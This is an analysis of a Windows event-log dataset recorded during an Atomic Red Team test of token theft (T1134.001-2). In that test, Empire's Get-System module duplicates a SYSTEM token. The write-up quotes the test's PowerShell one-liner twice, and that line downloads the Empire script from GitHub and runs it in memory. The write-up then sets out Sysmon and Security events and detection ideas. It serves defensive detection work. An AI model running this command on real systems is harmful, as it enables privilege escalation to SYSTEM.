# T1134.001-2: Token Impersonation/Theft — SeDebugPrivilege Token Duplication

## Technique Context

T1134.001 Token Impersonation/Theft covers multiple methods for stealing or duplicating Windows access tokens to impersonate privileged security contexts. While T1134.001-1 uses named pipe client impersonation, this test uses SeDebugPrivilege-based token duplication — a different and in some ways more direct approach.

`SeDebugPrivilege` is a Windows privilege that allows a process to open any process on the system with full access, including SYSTEM processes. When an attacker's process holds `SeDebugPrivilege`, they can call `OpenProcess()` on any running SYSTEM-privileged process (such as `winlogon.exe` or `services.exe`), then call `OpenProcessToken()` to obtain a handle to that process's token, and finally `DuplicateTokenEx()` to create an impersonatable copy. The duplicated token can then be passed to `CreateProcessWithTokenW()` or `ImpersonateLoggedOnUser()` to execute code under the target context.

This test again uses the Empire `Get-System` module but with the `Token` technique variant:

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
```

The same Empire script is used as T1134.001-1 but the `Token` technique is invoked instead of `NamedPipe`. This illustrates how a single offensive PowerShell module supports multiple privilege escalation pathways.

## What This Dataset Contains

The dataset captures 28 Sysmon events, 3 Security events, and 113 PowerShell events recorded on ACME-WS06 with Windows Defender fully disabled.

Security EID 4688 records the spawned PowerShell child with the command line:

```
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose}
```

Sysmon EID 1 records this with full hashes: PowerShell SHA256 `3247BCFD...`, IMPHASH `AFACF6DC...`.

This dataset has a particularly notable pair of Sysmon events not present in T1134.001-1:

**Sysmon EID 22 (DNS Query):**
```
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
QueryName: raw.githubusercontent.com
User: NT AUTHORITY\SYSTEM
```

**Sysmon EID 3 (Network Connection):**
```
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
DestinationIp: 185.199.109.133
DestinationPort: 443
User: NT AUTHORITY\SYSTEM
```

These two events confirm that `powershell.exe` running as SYSTEM resolved `raw.githubusercontent.com` and established an outbound TLS connection to `185.199.109.133:443` to download the Empire `Get-System.ps1` script. `185.199.109.133` is one of GitHub's CDN IP addresses (the `raw.githubusercontent.com` service). This is the download step for the attack payload.

Sysmon EID 10 records PowerShell accessing the spawned child with `GrantedAccess: 0x1FFFFF`, and a second EID 10 records the child PowerShell being accessed by its parent process — consistent with the process lifecycle for `Get-System`'s token duplication work.

The Security channel (3 events) is smaller than T1134.001-1's 4 events. Two `whoami.exe` EID 4688 events are present (pre- and post-technique), and one EID 4688 for the spawned Empire PowerShell. The cleanup command block EID 4688 from the ART test framework appears to have been outside the event sample window.

Sysmon EID 11 records `StartupProfileData-NonInteractive` creation for the SYSTEM profile.

The PowerShell channel (113 events, EID 4104) again consists primarily of ART test framework boilerplate. The Empire `Get-System.ps1` script block logging would be distributed across many EID 4104 events in the child process context.

## What This Dataset Does Not Contain

The `Token` technique in `Get-System` calls `OpenProcess()`, `OpenProcessToken()`, and `DuplicateTokenEx()` on a target SYSTEM process. These API calls are not directly logged by the Security channel (Privilege Use auditing is not enabled). Sysmon EID 10 (Process Accessed) does capture the target process access if `Get-System` opens another process; however, since `Get-System`'s `Token` technique targets processes that are already running under SYSTEM, and the test itself is running as SYSTEM, the OpenProcess call to another SYSTEM process may not generate an EID 10 event (Sysmon typically only logs cross-privilege-boundary opens).

No Security EID 4672 (Special Logon) or EID 4624 (Logon) events recording the duplicated SYSTEM token are present in this sample.

Compared to the defended variant (27 Sysmon / 10 Security / 44 PowerShell), this dataset is nearly identical in Sysmon (28 vs. 27) and Security (3 vs. 10). The Security difference again reflects Defender inspection events in the defended run. The PowerShell channel is significantly larger (113 vs. 44) for the same AMSI-absence reason.

## Assessment

The standout value of this dataset relative to T1134.001-1 is the presence of Sysmon EID 22 and EID 3 capturing the network download. These two events, combined with the EID 4688 command line, provide a complete kill-chain record: command invocation → DNS resolution → network connection → in-memory execution. The specific destination IP `185.199.109.133` (GitHub CDN) and port `443` are observable.

The command-line difference between this test and T1134.001-1 is exactly one word: `-Technique NamedPipe` vs. `-Technique Token`. This highlights an important detection design principle: analytics that match on `Get-System` function invocation without binding to the technique argument will cover both variants; analytics that try to distinguish between techniques based on command-line content need to handle both argument values.

The Empire script commit hash `f6efd5a963d424a1f983d884b637da868e5df466` is the same in both T1134.001-1 and T1134.001-2, confirming the same Empire release was used. This hash can serve as a consistent IOC across multiple tests using this module.

## Detection Opportunities Present in This Data

**SYSTEM-context PowerShell making DNS query to `raw.githubusercontent.com`.** Sysmon EID 22 records `NT AUTHORITY\SYSTEM` running `powershell.exe` resolving GitHub's raw content CDN. SYSTEM-context processes have no business reaching out to GitHub for script downloads in a healthy environment.

**Outbound TLS connection from `powershell.exe` as SYSTEM.** Sysmon EID 3 records the connection to `185.199.109.133:443`. SYSTEM-context PowerShell making outbound connections to public IPs on port 443 is a high-fidelity indicator, particularly when correlated with an `IEX/IWR` command line.

**`Get-System -Technique Token` in process creation log.** Security EID 4688 and Sysmon EID 1 record the function call verbatim. `Get-System` is an Empire-specific function name with no legitimate purpose in enterprise environments.

**Empire GitHub URL with pinned commit hash.** The full URL including `f6efd5a963d424a1f983d884b637da868e5df466` is present in the command line. This specific commit is attributable to the Empire framework, providing direct threat-intelligence correlation.

**TLS connection timing correlated with IEX/IWR command line.** The network events (EID 22 + EID 3) occurring close in time to the process creation event (EID 1 / EID 4688) build a temporal correlation that confirms the download was initiated by the specific PowerShell invocation.
